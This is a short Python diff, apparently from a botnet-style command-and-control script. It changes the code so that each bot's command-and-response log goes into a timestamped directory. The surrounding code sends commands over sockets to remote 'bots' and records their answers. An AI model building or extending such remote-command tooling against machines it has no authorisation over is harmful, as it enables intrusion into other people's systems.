@@ -8,10 +8,11 @@ threads = []
 contador = [1]
 estado = [0]
 principalQueue = queue.Queue()
+directory = str(datetime.now())
 
 def createDirectories():
     try:
-        os.makedirs(str(datetime.now()))
+        os.makedirs(directory)
     except Exception as ex:
         print("[-]",ex)
         os._exit(0)
@@ -89,7 +90,7 @@ class botThread(threading.Thread):
                 #executeBotCmd+= "\n"
                 self.bot.send(executeBotCmd.encode('utf-8'))
                 ansBot = (self.bot.recv(1024)).decode('utf-8')
-                archivo = open("{}.txt".format(nameBot),"a")
+                archivo = open("./{}/{}.txt".format(directory,nameBot),"a")
                 archivo.write("{}:\n{}".format(executeBotCmd,ansBot))
                 archivo.close()
                 if(estado[0] == 0):
